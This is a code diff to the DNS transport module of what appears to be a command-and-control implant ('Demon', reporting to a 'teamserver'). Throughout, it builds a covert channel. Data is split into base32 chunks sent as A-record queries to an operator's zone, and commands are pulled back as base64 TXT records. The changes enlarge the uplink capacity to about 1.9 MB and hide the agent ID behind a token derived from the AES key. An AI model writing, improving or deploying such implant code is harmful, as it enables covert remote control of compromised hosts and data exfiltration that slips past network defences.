@@ -5,7 +5,15 @@
 #include <core/TransportDns.h>
 #include <core/Package.h>
 #include <core/MiniStd.h>
-#include <crypt/Base64.h>
+#include <crypt/AesCrypt.h>
+
+/* windns.h (pulled in by Demon.h via windows.h) defines DnsRecordListFree as a
+ * function-like macro: DnsRecordListFree(p,t) → DnsFree(p,DnsFreeRecordList).
+ * That expansion corrupts calls through the Win32 function-pointer struct member.
+ * Undefine it so the bare name is used as a struct member, not as a macro call. */
+#ifdef DnsRecordListFree
+#undef DnsRecordListFree
+#endif
 
 /* RFC 4648 base32 alphabet: a–z2–7, lowercase, no padding */
 static const CHAR B32Alphabet[ 32 ] = "abcdefghijklmnopqrstuvwxyz234567";
@@ -13,6 +21,17 @@ static const CHAR B32Alphabet[ 32 ] = "abcdefghijklmnopqrstuvwxyz234567";
 /* DnsQuery_W DNS_TYPE_A = 1, DNS_TYPE_TEXT = 16 */
 #define DNS_TYPE_A    1
 #define DNS_TYPE_TEXT 16
+
+static const CHAR HEX_DNS[] = "0123456789abcdef";
+
+static PCHAR DnsHexWrite( PCHAR dst, DWORD val, INT digits ) {
+    INT i;
+    for ( i = digits - 1; i >= 0; i-- ) {
+        dst[ i ] = HEX_DNS[ val & 0xf ];
+        val >>= 4;
+    }
+    return dst + digits;
+}
 
 /* ------------------------------------------------------------------ */
 /*  Base32 encode / decode                                             */
@@ -73,40 +92,58 @@ DWORD DnsBase32Decode( PCHAR In, DWORD InLen, PBYTE Out )
 /* ------------------------------------------------------------------ */
 
 /* Build uplink A-query FQDN into Out (must be ≥ 253 bytes).
- * Format: <b32chunk>.<seq4><cid2><tot2>.<aid8>.<zone> */
+ * Format: <b32chunk>.<seq4><cid4><tot4>.<tok8>.<zone>
+ * cid4/tot4 are 4 hex chars (2 bytes each) to support payloads up to
+ * 65535 × 30 = ~1.9 MB without cid/tot wrapping. */
 static VOID DnsBuildUploadFqdn(
     PBYTE  Chunk, DWORD ChunkLen,
-    UINT16 Seq,   BYTE  Cid, BYTE Tot,
-    DWORD  AgentID,
+    UINT16 Seq,   UINT16 Cid, UINT16 Tot,
+    DWORD  Token,
     LPWSTR Zone,
     PCHAR  Out
 ) {
-    CHAR b32[ 64 ]  = { 0 };
-    CHAR meta[ 9 ]  = { 0 };
-    CHAR aid[ 9 ]   = { 0 };
+    CHAR b32[ 64 ]   = { 0 };
+    CHAR meta[ 13 ]  = { 0 };
+    CHAR tok8[ 9 ]   = { 0 };
     CHAR zoneA[ 64 ] = { 0 };
     DWORD i;
 
     DnsBase32Encode( Chunk, ChunkLen, b32 );
 
-    /* meta = seq4 + cid2 + tot2 (8 hex chars) */
-    wsprintfA( meta, "%04x%02x%02x", (UINT)Seq, (UINT)Cid, (UINT)Tot );
-    wsprintfA( aid,  "%08x", AgentID );
+    /* meta = seq4 + cid4 + tot4 (12 hex chars) */
+    {
+        PCHAR p = meta;
+        p = DnsHexWrite( p, (DWORD)Seq, 4 );
+        p = DnsHexWrite( p, (DWORD)Cid, 4 );
+        p = DnsHexWrite( p, (DWORD)Tot, 4 );
+        *p = '\0';
+    }
+
+    DnsHexWrite( tok8, Token, 8 );
+    tok8[ 8 ] = '\0';
 
     /* Convert zone from WCHAR to CHAR */
     for ( i = 0; Zone[ i ] && i < 63; i++ )
         zoneA[ i ] = (CHAR)Zone[ i ];
     zoneA[ i ] = '\0';
 
-    wsprintfA( Out, "%s.%s.%s.%s", b32, meta, aid, zoneA );
+    /* Assemble: b32 + '.' + meta + '.' + tok8 + '.' + zone */
+    StringCopyA( Out, b32 );
+    StringConcatA( Out, "." );
+    StringConcatA( Out, meta );
+    StringConcatA( Out, "." );
+    StringConcatA( Out, tok8 );
+    StringConcatA( Out, "." );
+    StringConcatA( Out, zoneA );
 }
 
 /* Build downlink TXT-poll FQDN into Out.
- * Format: p.<seq4>.<off4>.<aid8>.<zone> */
+ * Format: p.<seq4>.<off8>.<tok8>.<zone>
+ * off8 is 8 hex chars (DWORD) — supports responses up to 4 GB. */
 static VOID DnsBuildPollFqdn(
     UINT16 Seq,
-    UINT16 Offset,
-    DWORD  AgentID,
+    DWORD  Offset,
+    DWORD  Token,
     LPWSTR Zone,
     PCHAR  Out
 ) {
@@ -117,7 +154,25 @@ static VOID DnsBuildPollFqdn(
         zoneA[ i ] = (CHAR)Zone[ i ];
     zoneA[ i ] = '\0';
 
-    wsprintfA( Out, "p.%04x.%04x.%08x.%s", (UINT)Seq, (UINT)Offset, AgentID, zoneA );
+    /* Assemble: "p." + seq4 + "." + off8 + "." + tok8 + "." + zone */
+    {
+        CHAR seq4[ 5 ] = { 0 };
+        CHAR off8[ 9 ] = { 0 };
+        CHAR tok8[ 9 ] = { 0 };
+
+        DnsHexWrite( seq4, (DWORD)Seq, 4 ); seq4[ 4 ] = '\0';
+        DnsHexWrite( off8, Offset,     8 ); off8[ 8 ] = '\0';
+        DnsHexWrite( tok8, Token,      8 ); tok8[ 8 ] = '\0';
+
+        StringCopyA( Out, "p." );
+        StringConcatA( Out, seq4 );
+        StringConcatA( Out, "." );
+        StringConcatA( Out, off8 );
+        StringConcatA( Out, "." );
+        StringConcatA( Out, tok8 );
+        StringConcatA( Out, "." );
+        StringConcatA( Out, zoneA );
+    }
 }
 
 /* ------------------------------------------------------------------ */
@@ -185,18 +240,28 @@ static DWORD DnsQueryTxt( PCHAR Fqdn, PBYTE OutBuf, DWORD OutMax )
     /* Iterate TXT strings in the first TEXT record */
     if ( pRec->wType == DNS_TYPE_TEXT && pRec->Data.TXT.dwStringCount > 0 )
     {
-        LPWSTR wStr = pRec->Data.TXT.pStringArray[ 0 ];
-        CHAR   aStr[ 512 ] = { 0 };
-        DWORD  sLen        = 0;
+        /* DnsQuery_W returns DNS_RECORDW: TXT pStringArray entries are PWSTR (wide chars).
+         * Measure wide string length, then extract the low byte of each WCHAR into a
+         * narrow buffer before base64 decoding (TXT content is always ASCII base64). */
+        PWSTR  wStr = (PWSTR)pRec->Data.TXT.pStringArray[ 0 ];
+        DWORD  wLen = 0;
+        while ( wStr[ wLen ] ) wLen++;
 
-        while ( wStr[ sLen ] && sLen < 511 )
+        CHAR   narrow[ 512 ] = { 0 };
+        DWORD  nLen = wLen < 511 ? wLen : 511;
+        for ( DWORD k = 0; k < nLen; k++ )
+            narrow[ k ] = (CHAR)( wStr[ k ] & 0xFF );
+
+        PVOID  DecBuf = NULL;
+        SIZE_T DecLen = 0;
+        Base64Decode( (PUCHAR)narrow, (SIZE_T)nLen, &DecBuf, &DecLen );
+        if ( DecBuf && DecLen > 0 )
         {
-            aStr[ sLen ] = (CHAR)wStr[ sLen ];
-            sLen++;
+            DWORD copyLen = (DWORD)( DecLen > (SIZE_T)OutMax ? (SIZE_T)OutMax : DecLen );
+            MemCopy( OutBuf, DecBuf, copyLen );
+            Instance->Win32.LocalFree( DecBuf );
+            decoded = copyLen;
         }
-
-        /* Base64 decode into OutBuf */
-        decoded = Base64Decode( (PBYTE)aStr, sLen, OutBuf, OutMax );
     }
 
     Instance->Win32.DnsRecordListFree( pRec, DnsFreeRecordList );
@@ -209,10 +274,10 @@ static DWORD DnsQueryTxt( PCHAR Fqdn, PBYTE OutBuf, DWORD OutMax )
 
 BOOL DnsSend( PBUFFER SendData, PBUFFER RecvData )
 {
-    DWORD   AgentID  = Instance->Session.AgentID;
-    UINT16  Seq      = Instance->Config.Transport.DnsCtx.SeqNum;
-    LPWSTR  Zone     = Instance->Config.Transport.DnsCtx.Dns.ZoneDomain;
-    DWORD   ChunkDelay = Instance->Config.Transport.DnsCtx.Dns.ChunkDelayMs;
+    UINT16  Seq        = Instance->Config.Transport.DnsCtx.SeqNum;
+    LPWSTR  Zone       = Instance->Config.Transport.DnsCtx.ZoneDomain;
+    DWORD   ChunkDelay = Instance->Config.Transport.DnsCtx.ChunkDelayMs;
+    DWORD   Token      = Instance->Config.Transport.DnsCtx.SessionToken;
 
     PBYTE   Data    = (PBYTE)SendData->Buffer;
     DWORD   DataLen = (DWORD)SendData->Length;
@@ -229,19 +294,21 @@ BOOL DnsSend( PBUFFER SendData, PBUFFER RecvData )
     Instance->Config.Transport.DnsCtx.SeqNum = Seq;
 
     /* -------- UPLINK: send data as A-query chunks -------- */
-    BYTE  TotalChunks = (BYTE)( ( DataLen + DNS_CHUNK_BYTES - 1 ) / DNS_CHUNK_BYTES );
+    /* Use DWORD/UINT16 — BYTE would overflow (max 255) for payloads > 7,650 bytes,
+     * silently truncating the chunk count and causing partial uplink delivery. */
+    DWORD  TotalChunks = ( DataLen + DNS_CHUNK_BYTES - 1 ) / DNS_CHUNK_BYTES;
     if ( TotalChunks == 0 ) TotalChunks = 1;
 
-    for ( BYTE cid = 0; cid < TotalChunks; cid++ )
+    for ( DWORD cid = 0; cid < TotalChunks; cid++ )
     {
-        off      = (DWORD)cid * DNS_CHUNK_BYTES;
+        off      = cid * DNS_CHUNK_BYTES;
         chunkLen = DataLen - off;
         if ( chunkLen > DNS_CHUNK_BYTES ) chunkLen = DNS_CHUNK_BYTES;
 
         DnsBuildUploadFqdn(
             Data + off, chunkLen,
-            Seq, cid, TotalChunks,
-            AgentID,
+            Seq, (UINT16)cid, (UINT16)TotalChunks,
+            Token,
             Zone,
             Fqdn
         );
@@ -263,7 +330,7 @@ BOOL DnsSend( PBUFFER SendData, PBUFFER RecvData )
     }
 
     /* -------- DOWNLINK: poll TXT records for server response -------- */
-    UINT16 PollOffset = 0;
+    DWORD  PollOffset = 0;
     BOOL   Done       = FALSE;
     DWORD  Iter       = 0;
 
@@ -281,7 +348,7 @@ BOOL DnsSend( PBUFFER SendData, PBUFFER RecvData )
         Iter++;
         MemZero( TxtBuf, sizeof( TxtBuf ) );
 
-        DnsBuildPollFqdn( Seq, PollOffset, AgentID, Zone, Fqdn );
+        DnsBuildPollFqdn( Seq, PollOffset, Token, Zone, Fqdn );
 
         DWORD Got = DnsQueryTxt( Fqdn, TxtBuf, sizeof( TxtBuf ) );
         if ( Got == 0 )
@@ -320,7 +387,7 @@ BOOL DnsSend( PBUFFER SendData, PBUFFER RecvData )
             }
             MemCopy( RespBuf + RespLen, TxtBuf, Got );
             RespLen   += Got;
-            PollOffset += (UINT16)( Got );
+            PollOffset += Got;
         }
     }
 
@@ -341,32 +408,40 @@ BOOL DnsSend( PBUFFER SendData, PBUFFER RecvData )
 
 BOOL DnsTransportInit( VOID )
 {
-    PVOID  RawData = NULL;
-    SIZE_T RawSize = 0;
+    PVOID  Response = NULL;
+    SIZE_T RespSize = 0;
+    BOOL   Result   = FALSE;
 
-    /* PackageTransmitNow assembles and encrypts MetaData, writes to RawData/RawSize */
-    if ( !PackageTransmitNow( Instance->MetaData, &RawData, &RawSize ) )
+    /* Derive an opaque per-session token from the AES key bytes.
+     * This value identifies DNS downlink responses without exposing the agent ID. */
+    Instance->Config.Transport.DnsCtx.SessionToken =
+          (UINT32)Instance->Config.AES.Key[ 0 ]
+        | ( (UINT32)Instance->Config.AES.Key[ 1 ] << 8  )
+        | ( (UINT32)Instance->Config.AES.Key[ 2 ] << 16 )
+        | ( (UINT32)Instance->Config.AES.Key[ 3 ] << 24 );
+
+    /* PackageTransmitNow internally calls TransportSend → DnsSend.
+     * On success Response holds the server's AES-encrypted reply.
+     * Do NOT call DnsSend again. */
+    if ( !PackageTransmitNow( Instance->MetaData, &Response, &RespSize ) )
         return FALSE;
 
-    BUFFER Send = { .Buffer = RawData, .Length = RawSize };
-    BUFFER Recv = { 0 };
-
-    if ( !DnsSend( &Send, &Recv ) )
-        return FALSE;
-
-    /* The teamserver echoes back the 4-byte AgentID encrypted with AES */
-    if ( Recv.Buffer && Recv.Length >= 4 )
+    if ( Response && RespSize >= 4 )
     {
-        if ( (UINT32)Instance->Session.AgentID == (UINT32)DEREF( Recv.Buffer ) )
-        {
-            Instance->Session.Connected = TRUE;
-            Instance->Win32.LocalFree( Recv.Buffer );
-            return TRUE;
-        }
-        Instance->Win32.LocalFree( Recv.Buffer );
+        AESCTX AesCtx = { 0 };
+
+        /* Server encrypts the AgentID echo with the session AES key.
+         * Decrypt before comparing — mirrors the HTTP transport init in Transport.c. */
+        AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
+        AesXCryptBuffer( &AesCtx, Response, RespSize );
+
+        if ( (UINT32)Instance->Session.AgentID == (UINT32)DEREF( Response ) )
+            Result = TRUE;
+
+        Instance->Win32.LocalFree( Response );
     }
 
-    return FALSE;
+    return Result;
 }
 
 #endif /* TRANSPORT_DNS */
